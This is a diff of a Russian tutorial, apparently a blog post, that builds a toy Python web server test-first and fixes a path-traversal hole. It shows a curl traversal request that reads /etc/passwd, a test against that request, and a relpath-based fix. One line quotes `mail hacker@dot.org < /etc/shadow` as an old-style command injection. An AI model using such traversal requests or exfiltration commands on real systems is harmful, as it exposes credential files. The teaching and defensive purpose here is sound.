@@ -35,7 +35,7 @@
         raise                                # всё остальное - не наше дело
     request.reply(body=data, content_length=len(data))</code>
 
-Теперь всё проходит. Теперь можно сделать «однострочный веб сервер» для раздачи файлов из текущего каталога в баше, который можно вызывать через `python -m serve`. Пока оно не установлено в пути python из любого каталога конечно не прокатит, но из возле самого сервера работать вполне будет.
+Теперь всё проходит. Можно сделать «однострочный веб сервер» для раздачи файлов из текущего каталога в баше, который можно вызывать через `python -m serve`. Пока оно не установлено в пути python из любого каталога конечно не прокатит, но из возле самого сервера работать вполне будет.
 <code lang='python'>if __name__ == '__main__':
     server = HTTPServer()
     from handlers import serve_static
@@ -43,12 +43,14 @@
     server.serve()</code>
 
 Запускаем, пробуем:
+
 <code lang='bash'>curl http://localhost:8000/handlers.py
 def serve_static(request):
     try:
 ...</code>
 
 Работает. Пробуем дальше:
+
 <code lang='bash'>curl http://localhost:8000/../../../../../../../../../../../etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
@@ -57,6 +59,7 @@ sys:x:3:3:sys:/dev:/bin/sh
 ...</code>
 
 Ой! К счастью сервер запущен не от рута и /etc/shadow в безопасности. Но сервер при этом жёстко крашнется:
+
 <code lang='bash'>GET /../../../../../../../../../../../etc/shadow {'HOST': 'localhost:8000', 'ACCEPT': '*/*', 'USER-AGENT': 'curl/7.21.0 (x86_64-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18'}
 Traceback (most recent call last):
 ...
@@ -65,6 +68,7 @@ Traceback (most recent call last):
 IOError: [Errno 13] Permission denied: '../../../../../../../../../../../etc/shadow'</code>
 
 Сразу допишем в <b>test_handlers</b> вредный тест, который будет рушить «сервер» в комфортной обстановке:
+
 <code lang='python'>self.server.register(lambda r: r.url == '/crash/me/', lambda r: no_you)
 eq_('500', self.client('/crash/me/')[0][1])</code>
 Тесты начали фэйлиться с "NameError: global name 'no_you' is not defined". Замечательно, то что нужно.
@@ -77,7 +81,7 @@ eq_('500', self.client('/crash/me/')[0][1])</code>
             return True
 except Exception as err:                                              # ловим все ошибки
     request.reply('500', 'Infernal server error', 'Ай нанэ-нанэ...')  # и сообщаем в ответе
-    return False  # обязательно заканчиваем выполнение после request.reply чтобы не слать уже в закрытый сокет
+    return False  # обязательно заканчиваем выполнение после request.reply чтобы не слать уже в закрытое соединение
 # соединение закрыто, сервер продолжает свою работу</code>
 Конечно, это не защитит от всяких фатальных ошибок типа вызывающих core dump, но уже что-то. Тесты теперь ловят свой законный «груз 500», но человек, заглянувший браузером останется в непонятках и будет зол. Особенно если это сам разработчик в поисках проблемы. Питон позволяет не просто отлавливать код и сообщение ошибки, но и ситуацию, в которой она возникла. А заполучить это нам поможет штатный модуль <b>traceback</b>.
 
@@ -98,4 +102,35 @@ curl стал показывать трейсбек и ошибку, что зн
     data = open(request.url[1:]).read()
 IOError: [Errno 13] Permission denied: '../../../../../../../../../../../etc/shadow'</code>
 
+Этому хаку уже <s>сто лет</s> <a href="http://ru.wikipedia.org/CERN_httpd">21 год</a> в обед и нам ещё повезло, что open не умеет выполнять команды внутри скобок типа `mail hacker@dot.org < /etc/shadow` и прочие шелловские штучки, которым были подвержены в детском возрасте многие демоны. Но всё же, даже такая штука весьма неприятна даже если сервер запущен от nobody:nogroup.
+
+Сегодня — день TDD, поэтому сразу заготавливаем проверку. Это уже не для сервера в целом, а для конкретного хэндлера, поэтому и отправляется в его набор <b>test_static</b>:
+<code lang='python'>eq_('404', self.client('/../../../../../../../../../../../etc/passwd')[0][1])</code>
+
+Убедившись, что nosetests выдаёт наш «законный» AssertionError: '404' != '200', отправляемся писать фикс.
+
+В библиотеке <b>os.path</b> есть много интересных функций, поэкспериментировав с которыми можно найти одну, которая выдаёт, что указаный путь выходит за уровень начального:
+<code lang='python'>from os.path import relpath
+
+def serve_static(request):
+    path = request.url[1:]              # сразу отрезаем кусочек из урла, он нам дальше ещё везде пригодится
+    if relpath(path).startswith('..'):  # побег! аларм!
+        return request.reply('404', 'Not found', '%s: not found' % path)  # отказываемся обслуживать запрос</code>
+
+Что-то я уже подзадолбался писать «return request.reply()», тем более, что сервер в итоге и так ещё потом пытается ловить ошибки. А ведь 4хх и 5хх это именно ошибки и есть. Вынесем их в отдельный класс исключений, которые затем можно будет везде бросать и ловить:
+
+<code lang='python'>class HTTPError(Exception):
+    pass</code>
+
+И всё. Остальные могут его импортировать и пользоваться. Сделаем для него специальный способ обработки в диспетчере:
+<code lang='python'>...
+except HTTPError as error:
+    err_code = error.args[0]  # передаём код ошибки в аргументе исключения
+    reply = {             # сообщения стандартные
+        404: 'Not found',
+        403: 'Permission denied',
+    }[err_code]               # питонский аналог switch/case
+    request.reply(str(err_code), reply, "%s: %s" % (reply, request.url)) # формируем ответ
+    return False                                                         # и отваливаемся
+...</code>
 
